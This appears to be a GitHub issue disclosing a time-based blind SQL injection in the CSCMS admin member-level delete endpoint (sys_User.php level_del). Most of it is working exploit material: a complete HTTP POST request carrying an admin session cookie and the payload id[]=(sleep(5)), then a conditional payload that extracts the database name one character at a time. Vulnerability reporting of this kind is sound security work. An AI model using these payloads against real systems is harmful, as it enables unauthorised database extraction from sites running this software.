### **[Am1azi3ng](/Am1azi3ng)** commented [Apr 20, 2022](#issue-1209049714)

| Details there is a Injection vulnerability exists in sys\_User.php\_level\_del  The administrator needs to add a member after logging in. SQL injection vulnerability is generated when deleting the member. The constructed malicious payload is as follows  ``` POST /admin.php/user/level_del HTTP/1.1 Host: cscms.test Content-Length: 15 Accept: application/json, text/javascript, */*; q=0.01 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://cscms.test Referer: http://cscms.test/admin.php/user/level?v=2012 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: cscms_admin_id=3HtLFUmqgin4; cscms_admin_login=6hHRwKPiGz1%2FN9C4hmVHcOkF4oyCoI8lNzjjyeMF3fURy57grmVzbA; cscms_session=6g124miit249dnkv508bnrsshc8ugiss;XDEBUG_SESSION=PHPSTORM Connection: close  id[]=(sleep(5))  ```  [image](https://user-images.githubusercontent.com/96719328/164127815-aa442950-5497-4ccb-8d9f-259ac809fe3d.png)  You can see that success makes the server sleep Construct payload to guess the database  `(case(1)when(ascii(substr((select(database()))from(1)for(1)))=99)then(sleep(5))else(1)end)`  [image](https://user-images.githubusercontent.com/96719328/164127890-ab90a042-1887-47af-8ffb-ee8ea829258d.png)  [image](https://user-images.githubusercontent.com/96719328/164127890-ab90a042-1887-47af-8ffb-ee8ea829258d.png)  There is blind SQL injection. Because the database name is "cscms", the string returned by select database() starts with 'C', substr ((select + database()), 1,1) = 'C' is true, and the verification is correct |
